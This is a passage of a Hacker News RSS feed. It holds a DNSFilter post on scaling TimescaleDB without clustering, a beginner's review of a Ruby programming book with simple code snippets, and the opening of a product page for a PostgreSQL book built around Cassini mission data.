</article><!-- #post-## -->

					
<!-- #comments -->

				
			</div></div>]]>
            </description>
            <link>https://opennebula.io/opennebula-joins-gaia-x/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25150302</guid>
            <pubDate>Thu, 19 Nov 2020 15:13:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Two Years of Scaling TimescaleDB Without Clustering]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25150265">thread link</a>) | @serenadns
<br/>
November 19, 2020 | https://www.dnsfilter.com/blog/timescaledb-performance/ | <a href="https://web.archive.org/web/*/https://www.dnsfilter.com/blog/timescaledb-performance/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-elementor-type="wp-post" data-elementor-id="4345" data-elementor-settings="[]"><div><div><section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="a1c80e6" data-element_type="section"><div><div><div data-id="5ff4de5" data-element_type="column"><div><div><div data-id="9e21dcc" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p><span>It’s been over 2 years since we made the switch from </span><a href="https://fltr.ai/2OOM" target="_blank" rel="noopener"><span>InfluxDB to TimescaleDB</span></a><span> at DNSFilter. You can read the </span><a href="https://fltr.ai/2OOO" target="_blank" rel="noopener"><span>original blog</span></a><span> for all the details on why we transitioned to TimescaleDB in the first place, but the main thing we were after was reliability. We’re still using TimescaleDB, and unsurprisingly we’ve made a lot of changes to our infrastructure since that original post as our total users have continued to grow. Over the last 2 years we’ve worked to optimize TimescaleDB performance, and we’ve done it all </span><i><span>without</span></i><span> clustering.</span></p><h2><span>Expectation Vs. Reality</span></h2><p><span>In 2018, I made the prediction that we could get to 3B queries per day without major structural changes to our setup. I wasn’t quite wrong, but I wasn’t totally right either.&nbsp;</span></p><p><span>After going roughly 18 months without issues (with daily queries steadily growing), we hit over 1.2B for the first time in October of 2019. It was the first sign that the actual hardware supporting TimescaleDB would have trouble getting to 3B daily queries. The server had trouble keeping up with </span><a href="https://kafka.apache.org/" target="_blank" rel="noopener"><span>Kafka</span></a><span>, and the lag was </span><i><span>hours</span></i><span> long. We weren’t losing queries like we had previously with InfluxDB, but the disk I/O of our TimescaleDB server had trouble keeping up.</span></p></div></div></div></div></div></div></div></div></section><section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="9b23b4b" data-element_type="section"><div><div><div data-id="e8c98dd" data-element_type="column"><div><div><div data-id="208228a" data-element_type="widget" data-widget_type="image.default"><div><div><figure> <img width="1024" height="329" src="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-1024x329.png" data-src="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-1024x329.png" alt="TimescaleDB Performance on our old server" data-srcset="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-1024x329.png 1024w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-300x96.png 300w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-768x246.png 768w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-500x160.png 500w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio.png 1331w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-1024x329.png 1024w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-300x96.png 300w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-768x246.png 768w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio-500x160.png 500w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_oldserverdiskio.png 1331w"><figcaption>You can see the server struggle in October 2019 and then hit a temporary wall in March 2020.</figcaption></figure></div></div></div></div></div></div></div></div></section><section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="7d801f6" data-element_type="section"><div><div><div data-id="7902b84" data-element_type="column"><div><div><div data-id="3ec0127" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p><span>We tweaked the ram usage in PostgreSQL and started to plan for a new approach.</span></p><p><span>At the time, this was just a spike in daily queries, but we knew we were approaching the moment where we would have to sustain over 1B queries daily. To help us out, we looked at setting up a virtual machine with </span><a href="https://www.digitalocean.com/" target="_blank" rel="noopener"><span>Digital Ocean</span></a><span>.</span></p><p><span>The original intention wasn’t to replace that server, it was just to take the load off of it. We wound up setting up 2 additional servers with Digital Ocean.&nbsp;</span></p><p><span>In February, our original server hit another wall and by March the Digital Ocean servers were officially online. For a few months, we had 3 TimescaleDB servers running (all receiving the same information) until it became clear the original server was no longer necessary. It wasn’t carrying much of the load anymore, and it was not as performant as the Digital Ocean servers. At that point, it was just deadweight and extra costs, so we deprecated it in June 2020.</span></p><h2><span>The spike that didn’t stop</span></h2><p><span>As of fall 2020, our daily requests have skyrocketed compared to where we were this time last year (even with that October spike in requests). To handle this sustained surge in requests, we’ve done something a little different: We now have one bare metal TimescaleDB server set up to handle </span><i><span>just</span></i><span> DNS requests. Our 2 Digital Ocean servers are currently still going strong, handling unique queries from our app and a portion of daily requests.</span></p><p><span>This change was prompted to accommodate an integration partner, but the cool thing is that we’ve actually doubled my original projection with this move. That bare metal server now processes about 6B requests per day. Granted, it does not handle the full load the Digital Ocean servers do. It handles DevOps monitoring of our infrastructure, handling far fewer read queries than our primary Digital Ocean server. Though it still processes a large number of requests daily with only 5% CPU utilization.</span></p><p><span>Meanwhile, the main Digital Ocean server rarely goes over 30% CPU utilization. Though as I’ll get into later, CPU isn’t the best metric for monitoring the health of these servers.</span></p><h2><span>The beginning of a major move to bare metal</span></h2></div></div></div></div></div></div></div></div></section><section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="308de7c" data-element_type="section"><div><div><div data-id="746c630" data-element_type="column"><div><div><div data-id="ae9e5a0" data-element_type="widget" data-widget_type="image.default"><div><div><figure> <img width="1024" height="576" src="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-1024x576.png" data-src="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-1024x576.png" alt="TimescaleDB performance on bare metal" data-srcset="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-1024x576.png 1024w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-300x169.png 300w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-768x432.png 768w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-1536x864.png 1536w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-2048x1152.png 2048w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-500x281.png 500w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-1024x576.png 1024w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-300x169.png 300w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-768x432.png 768w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-1536x864.png 1536w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-2048x1152.png 2048w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancePost_11102020_BareMetalServer-500x281.png 500w"><figcaption>This is our bare metal server. Our hosting provider is always nice enough to send a picture my way when I ask. They even gave me one as a magnet.</figcaption></figure></div></div></div></div></div></div></div></div></section><section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="43cd417" data-element_type="section"><div><div><div data-id="17169e9" data-element_type="column"><div><div><div data-id="c2094d2" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p><span>In the past, we were renting servers. But we didn’t see that being sustainable for our business long-term.</span></p><p><span>We saw 3 possible options, and we ran costs on all of them:</span></p><ul><li><span>Colocation</span></li><li><span>Continued server rental</span></li><li><span>A major move to AWS</span></li></ul><p>Colocation was the clear winner.</p><p><span>While you need to put money down upfront, the costs begin to go down month over month. After 3 years, our server costs will be half of what they would be if we continued renting—and nearly 1/17 of what a switch to AWS would be.&nbsp;</span></p><p><span>While the monetary benefits are pretty obvious, the actual drive performance of the colocated server would be 10 times better than the AWS servers. On top of that, our setup included 648TB/month, which would have cost us $37,000 </span><i><span>alone</span></i><span> with AWS.</span></p><p><span>That bare metal server handling 6B requests daily is a </span><a href="https://netactuate.com/colocation/" target="_blank" rel="noopener"><span>colocated server</span></a><span> we built with the help of our hosting provider, </span><a href="https://netactuate.com/" target="_blank" rel="noopener"><span>NetActuate</span></a><span>.</span></p><p><span>With the performance we’re currently seeing on our bare metal server (and the cost savings), we plan on migrating </span><i><span>everything</span></i><span> from Digital Ocean to bare metal. I just don’t see anything but colocation being able to meet our needs into the future.</span></p><p><span>Using colocated servers allows us to have the fastest, newest machines at a lower cost. I told NetActuate the specs I was looking for in a server, and then their team built everything, shipped it to the data center, and racked it for us.</span></p><p><span>It’s a happy medium. I don’t want DNSFilter to be in the business of running its own datacenter. Going this route still allows me to be hands-on while not having to worry about the actual hardware day-to-day.</span></p><p><span>The main challenge for me now is hiring DevOps staff to handle ongoing infrastructure and performance management that I’ve been doing the majority of.</span></p><h2><span>Monitoring&nbsp;</span></h2><p><span>Before putting any hardware into production, first I use </span><a href="https://serverscope.io/" target="_blank" rel="noopener"><span>ServerScope</span></a><span> to understand how performant that hardware can possibly be. It also lets me know if there is anything that might indicate a defect in the hardware. That’s something that might cause limitations to the hardware’s life expectancy.</span></p><p><span>To monitor all of our servers, across both our Timescale database and our anycast network, we use </span><a href="https://www.site24x7.com/" target="_blank" rel="noopener"><span>Site24x7</span></a><span>. Here, I’m able to check on KPIs, with the most important one in my day-to-day being Disk I/O.</span></p></div></div></div></div></div></div></div></div></section><section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="1198909" data-element_type="section"><div><div><div data-id="f411b25" data-element_type="column"><div><div><div data-id="972d48e" data-element_type="widget" data-widget_type="image.default"><div><p><img width="842" height="429" src="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_newserverlast3monthsdiskio.png" data-src="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_newserverlast3monthsdiskio.png" alt="Last 3 months TimescaleDB performance" data-srcset="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_newserverlast3monthsdiskio.png 842w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_newserverlast3monthsdiskio-300x153.png 300w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_newserverlast3monthsdiskio-768x391.png 768w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_newserverlast3monthsdiskio-840x429.png 840w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_newserverlast3monthsdiskio-500x255.png 500w" data-sizes="(max-width: 842px) 100vw, 842px" srcset="https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_newserverlast3monthsdiskio.png 842w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_newserverlast3monthsdiskio-300x153.png 300w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_newserverlast3monthsdiskio-768x391.png 768w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_newserverlast3monthsdiskio-840x429.png 840w, https://www.dnsfilter.com/wp-content/uploads/2020/11/TimescaleDBPerformancepost_11102020_newserverlast3monthsdiskio-500x255.png 500w"></p></div></div></div></div></div></div></div></section><section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="4bca6c0" data-element_type="section"><div><div><div data-id="52574cc" data-element_type="column"><div><div><div data-id="2d4a946" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p><span>The image above represents the Disk I/O of our main production server over Q3 2020. You can see it held steadily around 60 MB/sec for disk writes until the end of September. That’s around the time we had a huge uptick in daily queries, causing additional strain on the server. After seeing this, we decided to add our bare metal server to start handling a large portion of DNS queries. This took some of the load off of our primary server that is still handling user interface queries (in addition to a portion of DNS requests).</span></p><p><span>However, IOPS (Input/Output Operations Per Second) is arguably the best metric to look at since databases do short bursts of access. This is in contrast to a sustained (and uninterrupted) transfer, similar to the way a file server might write information. When using ServerScope, IOPS is the most significant metric I check prior to putting a server in production. It’s valuable to know what IOPS that server is capable of handling. To get an idea of the capacity we’re looking for, </span><a href="https://www.wiredzone.com/shop/product/10028190-intel-ssdpe2ke064t8-hard-drive-nvme-6-4tb-u-2-2-5in-pcie-3-1-3d-tlc-3dwpd-dc-p4610-series-2294" target="_blank" rel="noopener"><span>one recent storage drive</span></a><span> we put into production has a random read of 654k IOPS and random write of 210k IOPS.</span></p><p><span>CPU utilization is useful to know, but really you just want to make sure that your server isn’t hitting over 80% for days or weeks at a time. That’s a sign it’s working too hard and it needs some help.&nbsp;</span></p><p><span>Another aspect we monitor is Kafka lag. What we saw in October 2019 (and later in March 2020) was TimescaleDB suddenly falling behind. In fact, it was </span><i><span>hours</span></i><span> behind. Once we saw the lag, we could investigate Disk I/O to see what the root cause of the problem was. The issue here was (again) that huge amount of new queries. TimescaleDB was suddenly writing an amount of data from Kafka it was not accustomed to writing and could not keep up. Without the ability to discover what caused the lag and subsequently working to fix it, we would have continued to get further and further behind.</span></p><h2><span>No clusters, no problem…yet</span></h2><p><span>We are still running on open source TimescaleDB after 2 years. It’s been able to handle all of the additional queries we’re now getting with our increase in users after the hardware changes I’ve talked about above. And on top of that, we haven’t used clustering </span><i><span>at all</span></i><span>.</span></p><p><span>With the announcement of </span><a href="https://blog.timescale.com/blog/timescaledb-2-0-a-multi-node-petabyte-scale-completely-free-relational-database-for-time-series/" target="_blank" rel="noopener"><span>TimescaleDB 2.0</span></a><span> and the option to use clustering for multi-node deployments in the open source version, we can continue to use open source TimescaleDB without an issue.</span></p><p><span>We’re still running a single node instance, but we do plan on implementing clusters at some point. We’ve tested clustering in the past, but there were bugs, so we never committed fully. We also haven’t used partitioning. If we try clustering again and we still run into issues or if it doesn’t allow us to scale the way we want to, partitioning is the next thing on the list for us to test.</span></p><p><span>One recent optimization we’ve made is to have chunks fit in RAM. This is a recommendation I discovered recently in </span><a href="https://docs.timescale.com/latest/api#create_hypertable-best-practices" target="_blank" rel="noopener"><span>TimescaleDB’s documentation around best practices</span></a><span>.&nbsp;</span></p><p><span>For a long time, we had our chunk interval set as a single day (24 hours). When we weren’t even breaking 200M queries a few years ago, that was fine. But we’ve grown so much, so each of our TimescaleDB servers has a separate chunk interval time. Our primary server is now set at 4 hours, and our dedicated query server (the one handling 6B queries daily) is set to </span><b>20 minutes</b><span>. This is a recent change, so it will take some time to get a clear idea of how much this change has benefited our infrastructure.</span></p><p><span>After 2 years of scaling TimescaleDB, I can make more accurate estimates and plan better. Now I know what type of stress 1B queries will put on our current servers and what changes need to be made to accommodate those new queries. We’ve also carefully mapped out our costs for the next 3 years, which will only benefit us when we run into the inevitable hiccup.&nbsp;</span></p><p><span>There is a lot more we plan on testing with TimescaleDB going forward, but we have a good idea of what the future of our server infrastructure will look like.</span></p></div></div></div></div></div></div></div></div></section><section data-particle_enable="false" data-particle-mobile-disabled="false" data-id="fa18430" data-element_type="section"></section></div></div></div></div></div>]]>
            </description>
            <link>https://www.dnsfilter.com/blog/timescaledb-performance/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25150265</guid>
            <pubDate>Thu, 19 Nov 2020 15:09:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Review of the Ruby Programming Language]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25150125">thread link</a>) | @connerj
<br/>
November 19, 2020 | https://www.connerjensen.com/blog/the_ruby_programming_language_review | <a href="https://web.archive.org/web/*/https://www.connerjensen.com/blog/the_ruby_programming_language_review">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h3>My Review of The Ruby Programming Language</h3>
<p>I needed to learn Ruby for a new job I was starting, and after a quick google search I came across <em>The Ruby Programming Language</em>.</p>
<p>After ordering it off <a href="https://www.amazon.com/Ruby-Programming-Language-Everything-Need/dp/0596516177/ref=sr_1_3?dchild=1&amp;keywords=the+ruby+programming+language&amp;qid=1602857932&amp;sr=8-3">Amazon</a> and receiving it in the mail, I cracked it open and began reading.</p>
<p><strong><em>The following is a list of things that I learned from reading this book, hopefully they will be as helpful to you as they were to me.</em></strong></p>
<p>One of the first things I was curious about is how Ruby developers view documentation.</p>
<p>The book quickly answered my question by introducing me to <em>ri</em> ruby documentation tool.</p>
<h4>ri ruby documentation</h4>
<p><em>ri</em> can be invoked followed by the name of a Ruby class, module or method and you can view the documentation right there in your terminal.</p>
<pre><code>ri String
</code></pre>
<p>The next great thing this book introduced to me was the ability to run ruby with the -w flag</p>
<h4>Ruby with the -w flag</h4>
<p>Coming from a compiled language I was missing some of the feedback it gave me while writing programs.</p>
<p>The ruby -w flag will warn you about possible things that could break your program while it is executing and takes the place of helpful compile time errors/warnings</p>
<h4>All numeric objects are immutable</h4>
<p>There are no methods that allow you to change the value of a numeric object. This is nice to know when passing numeric objects around, there is no need to worry that a method will modify the numeric object.</p>
<h4>Avoid using string literals in loops</h4>
<p>String literals are mutable, therefore Ruby cannot use the same object to represent two identical string literals.</p>
<pre><code>i = 0
while i &lt; 100
    print "hello".object_id
end
</code></pre>
<p>If you are using string literals in a loop, a new string will be created for each iteration of the loop.</p>
<h4>Make a copy of an array</h4>
<p>You can make a copy of an existing array by passing it to <code>Array.new(array_to_be_copied)</code></p>
<p>This will be useful if you don't want to mutate the old array and you want to keep your methods pure.</p>
<h4>Use symbols when you don't care about content</h4>
<p>If you are using strings not for their content, but as a unique identifier, then you should use a symbol, they are cheaper and immutable by default.</p>
<h4>Most objects are passsed by reference (pass-reference-by-value)</h4>
<p>All objects, except for Fixnum, and Symbol are passed by reference, which means the method they are passed to can mutate them.</p>
<p>Changes made to an object inside a method are visible outside the methods scope.</p>
<p>Ruby actually uses <a href="https://robertheaton.com/2014/07/22/is-ruby-pass-by-reference-or-pass-by-value/">pass-reference-by-value</a> semantics, which has some subtle, but important, differences (thanks to <a href="https://news.ycombinator.com/user?id=billyruffian">billyruffian</a> for pointing this out).</p>
<h4>Difference between an Objects <strong>Class</strong> and an Objects <strong>Type</strong></h4>
<p>An object only ever has one class and it never changes throughout the life of the object.</p>
<p>An objects's type can change throughout the life of the object. Type is defined as the set of behaviors that an object responds to, or put another way, the set of methods this object has.</p>
<p>Use is _ a? to check an objects class and respond _ to? to check an objects type.</p>
<p>An Objects type is also known as duck typing, if it walks like a duck and talks like a duck, then it's a duck.</p>
<h4>Only nil and false are False</h4>
<p>The only two values in ruby that are False are nil and false. Even an empty string "" or 0 are truthy.</p>
<h4>Multiple assignment with many left values and a single right value</h4>
<pre><code>x, y, z = [1,2,3]
</code></pre>
<p>This assignment will produce the outcome of x = 1, y = 2, and z = 3</p>
<h4>The ? operator is the only ternary operator (three operands) in ruby</h4>
<pre><code>n == 1 ? 'message' : 'message'
</code></pre>
<p>This acts as a compact if/then/else statements</p>
<p>If the expression on the left evalutates to true, then the value on the left side of : is used, otherwise the value on the right side of : is used.</p>
<h4>Raising exceptions</h4>
<p>Raise an exception with <code>raise</code> method. If called with no arguments it raises a <strong>RuntimeError</strong>. If called with a single string argument it creates a new RuntimeError exception object with the specified string as its message.</p>
<h4>Handling exceptions</h4>
<p>Handle an exception with the a <code>begin</code> statement and a <code>rescue</code> clause.</p>
<pre><code>begin
  #attempt some statements
rescue
  #write your exceptions handling code here
end
</code></pre>
<h4>Name the exception object</h4>
<p>You can name the exception in the rescue clause, then use it in your exception handling code.</p>
<pre><code>begin
  #attempt some statements
rescue =&gt; ex
  #handle the exception here
  puts "#{ex.class}: #{ex.message}"
end
</code></pre>
<h4>Using Proc objects</h4>
<p>If you have the following code</p>
<pre><code>a, b = [1,2,3], [4,5]
sum = a.inject(0) { |total, x| total + x }
sum = b.inject(sum) { |total, x| total + x }
</code></pre>
<p>You can remove the duplication of the blocks by creating a proc object</p>
<pre><code>summation = Proc.new { |total, x| total +x }
</code></pre>
<p>Then, as long as you prefix it with &amp;, you can pass this proc Object as the last parameter of any method invocation,</p>
<pre><code>sum = a.inject(0, &amp;summation)
sum = b.inject(sum, &amp;summation)
</code></pre>
<h4>Return statements in blocks and Procs</h4>
<p>Using <code>return</code> in a block will not only return to the invoking iterator, but it also returns from the method that invoked the iterator</p>
<p>Using <code>return</code> in a Proc has the same behavior, but with some added complexity.</p>
<p>Because turning a block into a Proc object allows us to pass this Proc object around to other methods, when the Proc object calls <code>return</code> it may attempt to return from a method call that has already been returned from. This will raise a <strong><em>LocalJumpError</em></strong></p>
<h4>Return statements in Lambdas</h4>
<p>Because lambdas are much like methods, using <code>return</code> in a lambda will work like a <code>return</code> statement in a method. It will return control to the enclosing scope in which the lambda was called in.</p>
<p>This makes it so we never need to worry about a <strong><em>LocalJumpError</em></strong></p>
<h3>Conclusion</h3>
<p>Hopefully, you learned something new from this post, I would highly recommend picking up <em>The Ruby Programming Language</em> it has much more to offer and does an excellent job of teaching the intricacies of the language.</p>
<p>Thanks for reading!</p>
<p>I will be following this post up with another post about what I'm learning from <em>The Ruby Programming Language</em> so keep an eye out for that.</p>
<p>Feel free to connect with me on Twitter @connerjensen780</p></div></div>]]>
            </description>
            <link>https://www.connerjensen.com/blog/the_ruby_programming_language_review</link>
            <guid isPermaLink="false">hacker-news-small-sites-25150125</guid>
            <pubDate>Thu, 19 Nov 2020 14:56:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Auto Task Scheduler Built in Notion]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25150038">thread link</a>) | @gogo61
<br/>
November 19, 2020 | https://rohitgupta.site/Auto-Task-Scheduler-b47d7c282eeb4ae0bd321f73ba75b4bd | <a href="https://web.archive.org/web/*/https://rohitgupta.site/Auto-Task-Scheduler-b47d7c282eeb4ae0bd321f73ba75b4bd">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://rohitgupta.site/Auto-Task-Scheduler-b47d7c282eeb4ae0bd321f73ba75b4bd</link>
            <guid isPermaLink="false">hacker-news-small-sites-25150038</guid>
            <pubDate>Thu, 19 Nov 2020 14:48:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Curious Moon]]>
            </title>
            <description>
<![CDATA[
Score 54 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25149803">thread link</a>) | @Tomte
<br/>
November 19, 2020 | https://bigmachine.io/products/a-curious-moon/ | <a href="https://web.archive.org/web/*/https://bigmachine.io/products/a-curious-moon/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="tcb_landing_page">
<div>
<div id="tve_flt"><div id="tve_editor" data-post-id="161773"><div data-inherit-lp-settings="1" data-css="tve-u-16cdc668863">

<div data-css="tve-u-16cdc61feee"><div data-aspect-ratio="16:9" data-float-visibility="mobile" data-overlay="0" data-type="vimeo" data-float="false" data-aspect-ratio-default="0" data-url="https://vimeo.com/247734637" data-float-width-m="300px" data-float-padding1-m="25px" data-float-padding2-m="25px" data-float-position="top-left" data-float-width-d="300px" data-float-padding1-d="25px" data-float-padding2-d="25px" data-css="tve-u-171ae0f3dad">
<div>
<div><iframe data-code="247734637" data-provider="vimeo" src="https://player.vimeo.com/video/247734637?portrait=1&amp;title=1&amp;color=fff&amp;byline=1&amp;autopause=0" data-src="https://player.vimeo.com/video/247734637?portrait=1&amp;title=1&amp;color=fff&amp;byline=1&amp;autopause=0" frameborder="0" allowfullscreen=""></iframe></div>
</div>
</div><div data-css="tve-u-1685be6002c">

<div><div data-css="tve-u-1685bea876e"><div data-css="tve-u-1685bea84b7"><div data-css="tve-u-1685beca9a6"><div data-css="tve-u-16cdd2b7da4"><p data-css="tve-u-1719fb93a47">Dive into &nbsp;<strong>raw data from the Cassini mission</strong> - straight from JPL, in the search for possible alien life. Oh yeah - <strong>and learn about PostgreSQL.</strong></p></div></div></div></div></div>
</div></div>
</div><div data-css="tve-u-16cd8a48aaa">

<div data-css="tve-u-16cd8a48ab5"><div data-css="tve-u-170e2ff2527">

<div><p data-tag="h2" data-css="tve-u-168603256ce"><h2 data-css="tve-u-16cdc6d1c80">You've found yourself in charge of a PostgreSQL database... <em>what now</em>?</h2></p><p data-css="tve-u-171a4c58cd8"><strong>Data is a powerful drug</strong> - it's the life blood of your business. How do you ensure that it's <strong>correct and tells the right story</strong>? PostgreSQL can help, but there's a lot more to this game.</p><div data-css="tve-u-1685c0e6c3b"><div data-css="tve-u-1685c0e6834"><div data-css="tve-u-16cdd398a82"><div data-css="tve-u-1685c14ddde"><div data-css="tve-u-16cdd2d3630"><p>Starting an application is simple enough, whether you use migrations, a model-synchronizer or good old-fashioned hand-rolled SQL. A year from now, however, when your app has grown and you're trying to measure what's happened... the story can quickly change when <strong>data is overwhelming you </strong>and you need to <strong>make sense</strong> of what's been accumulating.&nbsp;</p><p>Learning how PostgreSQL works is&nbsp;<em>just one aspect</em> of working with data. PostgreSQL is there to enable, enhance and extend what you do as a developer/DBA. And just like any tool in your toolbox, <strong>it can help you create crap, slice off some fingers, or help you be the superstar that you are</strong>.</p><p>That's the perspective of&nbsp;<em>A Curious Moon</em> - data is the truth, data is your friend, data is your business. The tools you use (namely PostgreSQL) are simply there to safeguard your treasure and help you understand what it's telling you.</p></div></div></div><div data-css="tve-u-16cdd398b63"><div data-css="tve-u-1685c1512d6"><div data-css="tve-u-1685c127b2d"><p>But <strong>what does it mean to be "data-minded"? </strong>How do you even get started? These are good questions and ones I struggled with when outlining this book. I quickly realized that the only way you could truly understand the power and necessity of solid databsae design was to <strong>live the life of a new DBA... thrown into the fire</strong> like we all were at some point...</p><p>Meet Dee Yan, our fictional intern at Red:4 Aerospace. She's just been handed the keys to <strong>a massive set of data, straight from Saturn</strong>, and she has to load it up, evaluate it and then analyze it for a critical project. She knows that PostgreSQL exists... but that's about it.</p><p>Much more than a tutorial, this book has a narrative element to it a bit like&nbsp;<em>The Martian</em>, where you get to know Dee and the problems she faces as a new developer/DBA... and how she solves them.</p><p>The truth is in the data...</p></div></div></div></div></div></div>
</div></div>
</div><div data-css="tve-u-168604cedc5" data-inherit-lp-settings="1">

<div data-css="tve-u-1685c8a1093"><p data-tag="h2" data-css="tve-u-1685c0e8154"><h2 data-css="tve-u-1685c8db5fd"><em>A Curious Moon</em>: Exploring Cassini's Data with PostgreSQL</h2></p><div data-css="tve-u-1685c40e6db">

<div data-css="tve-u-1685c3f3ad3"><div><div><div><div><p><span><img alt="" data-id="357" width="330" data-init-width="550" height="530" data-init-height="883" title="cover_v3" loading="lazy" src="https://bigmachine.io/wp-content/uploads/2018/05/cover_v3.jpg" data-css="tve-u-171a8e23a1a" data-width="330" data-height="530" srcset="https://i1.wp.com/bigmachine.io/wp-content/uploads/2018/05/cover_v3.jpg?w=550&amp;ssl=1 550w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2018/05/cover_v3.jpg?resize=187%2C300&amp;ssl=1 187w" sizes="(max-width: 330px) 100vw, 330px"></span></p></div></div><div><div><div data-css="tve-u-171a9ed79f5"><p data-css="tve-u-171a8e37403">Follow along with Dee Yan, our fictional data science intern, as she assumes the job of interim database administrator at the fictional aerospace startup, Red:4. She’ll&nbsp;<strong>learn PostgreSQL</strong>&nbsp;like we all do:&nbsp;<em>on the job and under pressure</em>.</p><p>You’ll start out with the basics: creating tables and importing data. Soon, however, you’ll be awash in glorious SQL and data from space (<strong>the NASA/JPL archives of the Cassini mission</strong>), creating functions, common table expressions and calculating aggregates using window functions all in the name of science while trying to&nbsp;<strong>figure out if there’s life under the ice of a very curious little moon.</strong></p></div></div></div></div></div></div>
</div></div>
</div><div data-css="tve-u-16cd8a366f5" data-inherit-lp-settings="1">

<div data-css="tve-u-16cd8a36703"><div data-css="tve-u-171a8e493b9" tcb-template-name="Quote 15" tcb-template-id="41894" tcb-template-pack="137" data-keep-css_id="1"><div data-css="tve-u-171a8e493ba">

